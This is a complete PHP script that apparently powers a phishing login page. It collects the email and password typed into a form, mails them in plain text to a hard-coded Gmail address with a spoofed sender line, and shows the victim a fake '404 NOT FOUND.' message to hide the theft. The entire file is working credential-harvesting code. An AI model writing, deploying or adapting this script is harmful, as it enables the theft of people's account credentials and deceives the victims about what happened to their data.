<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "daviest022@gmail.com"; // Your email address
    $subject = "New Login Form Submission";
    $message = "Email: " . $_POST['email'] . "\nPassword: " . $_POST['password'];
    $headers = "From: dreymonk614@gmail.com"; // Your website email address

    if (mail($to, $subject, $message, $headers)) {
        echo "404 NOT FOUND.";
    } else {
        echo "ERROR.";
    }
}
?>
